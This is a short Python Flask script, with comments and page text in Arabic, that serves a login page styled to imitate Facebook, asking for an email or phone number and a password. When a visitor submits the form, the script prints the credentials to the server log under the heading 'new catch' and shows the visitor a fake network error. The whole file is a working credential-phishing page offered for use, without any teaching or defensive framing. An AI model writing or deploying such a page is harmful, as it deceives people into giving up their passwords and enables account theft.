from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# كود الصفحة مباشرة هنا باش ما يصرى حتى خطأ في الملفات
HTML_CODE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تسجيل الدخول</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; text-align: center; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 95%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>تسجيل الدخول</h2>
        <form action="/login" method="post">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
            <input type="password" name="password" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_CODE)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    # هذا هو الصح اللي راح تشوفو في السجلات
    print(f"\n🎯 صيدة جديدة جمرة:\n📧 الإيميل: {email}\n🔑 المودباس: {password}\n")
    return "خطأ في الشبكة، حاول لاحقاً"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
